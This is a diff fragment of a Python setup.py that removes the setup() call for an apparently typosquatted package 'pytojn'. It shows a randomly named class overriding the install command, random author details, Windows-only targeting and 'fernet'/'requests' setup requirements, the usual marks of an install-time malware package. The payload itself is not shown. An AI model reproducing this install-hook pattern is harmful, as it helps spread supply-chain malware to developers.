@@ -18,22 +18,5 @@ class LMXMmSGEreYjwGnZjerZBpuFPiYfjkyayLTTXYwQNslMyrahIPHViPoBnNcWgRaliplAqcYoVW
             install.run(self)
 
 
-setup(
-    name="pytojn",
-    version=VERSION,
-    author="oAPhBTcXYsScnoJH",
-    author_email="KmkVzxcxAZ@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': LMXMmSGEreYjwGnZjerZBpuFPiYfjkyayLTTXYwQNslMyrahIPHViPoBnNcWgRaliplAqcYoVWDNpLyjLQRzVwcMoIfJQXnvaOlHZvVwsIvN,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
 
